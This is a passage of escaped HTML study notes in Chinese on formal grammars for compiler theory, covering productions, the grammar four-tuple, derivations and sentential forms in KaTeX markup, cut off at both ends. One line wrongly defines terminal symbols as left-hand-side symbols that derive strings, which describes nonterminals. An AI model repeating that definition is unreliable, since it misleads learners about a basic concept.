文法</h3>\n<h4 id=\"文法的规则\"><a class=\"markdownIt-Anchor\" href=\"#文法的规则\"></a> 文法的规则</h4>\n<ol>\n<li>产生式（规则）是一个符号与一个符号串形成的有序对。写作<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow\\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>。意为左部符号用右部的符号串定义。</li>\n<li>一组规则规定了一个语言的语法结构。</li>\n<li>符号分两类：terminal符号和nonterminal符号。terminal符号定义为出现在规则左部、能派生出符号或者符号串的符号。</li>\n</ol>\n<h4 id=\"文法-2\"><a class=\"markdownIt-Anchor\" href=\"#文法-2\"></a> 文法</h4>\n<p>文法是规则的非空有穷集合，表示为四元组<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><msub><mi>V</mi><mi>T</mi></msub><mo separator=\"true\">,</mo><mi>P</mi><mo separator=\"true\">,</mo><mi>S</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G=\\left(V_{N},V_{T},P,S\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。<br />\n其中<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding=\"application/x-tex\">V_{N}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>是nonterminal符号，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>V</mi><mi>T</mi></msub></mrow><annotation encoding=\"application/x-tex\">V_{T}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>是terminal符号，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>P</mi></mrow><annotation encoding=\"application/x-tex\">P</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span></span></span></span>是规则集合，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>是文法的开始符号。</p>\n<h3 id=\"语言\"><a class=\"markdownIt-Anchor\" href=\"#语言\"></a> 语言</h3>\n<h4 id=\"推导\"><a class=\"markdownIt-Anchor\" href=\"#推导\"></a> 推导</h4>\n<h5 id=\"直接推导\"><a class=\"markdownIt-Anchor\" href=\"#直接推导\"></a> 直接推导</h5>\n<p>令<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>是一个文法。</p>\n<p>仅当<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>的一个规则且<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">x,y \\in \\left(V_{N} \\cup V_{T}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7335400000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>时，我们可以说：<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mi>A</mi><mi>y</mi><mo>⇒</mo><mi>x</mi><mi>α</mi><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">xAy\\Rightarrow x\\alpha y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span></span></span></span>。即，从左直接推导到右，仅使用一次规则。</p>\n<h4 id=\"推导的定义\"><a class=\"markdownIt-Anchor\" href=\"#推导的定义\"></a> 推导的定义</h4>\n<p>若存在一个直接推导序列：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mn>0</mn></msub><mo>⇒</mo><msub><mi>α</mi><mn>1</mn></msub><mo>⇒</mo><msub><mi>α</mi><mn>2</mn></msub><mo>⇒</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_{0}\\Rightarrow \\alpha_{1}\\Rightarrow \\alpha_{2}\\Rightarrow ... \\alpha_{n}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<p>则说这个序列是从<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_{0}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>到<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>、长度为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">n</span></span></span></span>的推导，记之为：<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mn>0</mn></msub><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_{0} \\stackrel{+}{\\Rightarrow} \\alpha_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.225201em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。长度大于等于1。</p>\n<h4 id=\"广义推导\"><a class=\"markdownIt-Anchor\" href=\"#广义推导\"></a> 广义推导</h4>\n<p>广义推导记为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mn>0</mn></msub><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_{0} \\stackrel{*}{\\Rightarrow} \\alpha_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.142566em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。与之前的推导相比，多了一个<strong>推出自己</strong>的行为。长度大于等于0。</p>\n<h4 id=\"句型\"><a class=\"markdownIt-Anchor\" href=\"#句型\"></a> 句型</h4>\n<p>设有文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G\\left[S\\right]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span></span></span></span>，若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">S \\stackrel{*}{\\Rightarrow}x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>，且<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mo>∈</mo><mo stretchy=\"false\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><msup><mo stretchy=\"false\">)</mo><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">x \\in (V_{N}\\cup V_{T})^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" 